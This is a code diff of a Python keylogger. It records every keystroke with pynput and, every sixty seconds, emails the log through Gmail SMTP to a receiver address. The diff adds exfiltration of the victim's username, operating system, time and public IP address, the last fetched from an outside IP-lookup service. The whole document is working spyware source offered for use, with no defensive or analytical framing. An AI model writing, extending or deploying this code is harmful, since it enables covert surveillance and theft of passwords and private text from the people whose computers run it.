@@ -1,17 +1,19 @@
-import pynput.keyboard
+import pynput.keyboard._win32
 import threading
 import smtplib
 from email.message import EmailMessage
-import subprocess
-#author : Kimanxo
+import getpass
+import platform
+import time 
+import requests
 
-#importing required modules
 
-log = ""
+
+log = " "
 
 class Keylogger:
 
-	def press(self, key): #adjusting options 
+	def press(self, key):
 			global log
 			try:
 				log = log + str(key.char)
@@ -45,26 +47,28 @@ class Keylogger:
 				else:
 					log = log + " " + str(key) + " "
 
-	def report(self): # report function [ timing ]
+	def report(self):
 		global log 
 		self.send_mail()
 		log = ""
-		timer = threading.Timer(60, self.report) #specify the period you want 
+		timer = threading.Timer(60, self.report)
 		timer.start()
 
 	def send_mail(self):
-		server = smtplib.SMTP_SSL('smtp.gmail.com', 465) #gmail SMTP settings
-		sender = 'example@gmail.com' #put your gmail here 
-		server.login(sender, 'yourpassword') #password
+		server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+		server.ehlo()
+		sender ='youremail@gmail.com'
+
+		server.login(sender,'your Gmail pass')
 		msg = EmailMessage()
 		msg['From'] = sender
-		msg['To'] = "receiver@mail.ru" # receiver email 
-		msg['Subject'] = "LOGS"
-		body = (log)
+		msg['To'] = "receiver@anymail.com"
+		msg['Subject'] = f"LOGS FROM  : {getpass.getuser()}"
+		info = f"user : {getpass.getuser()}\nOS : {platform.system()}\nTime : {time.ctime()}\nIP : {requests.get('https://api.ipify.org').text}\n "
+		body = (info + log)
 		msg.set_content(body)
 		server.send_message(msg)
 		server.quit()
-# ! Make sure you allow python to use the sender's  gmail (you will find it gmail settings )
 
 	def start(self):
 		Listener = pynput.keyboard.Listener(on_press = self.press) 
@@ -74,5 +78,8 @@ class Keylogger:
 
 XLogger = Keylogger()
 XLogger.start()
+			  
+
+
 			  
 
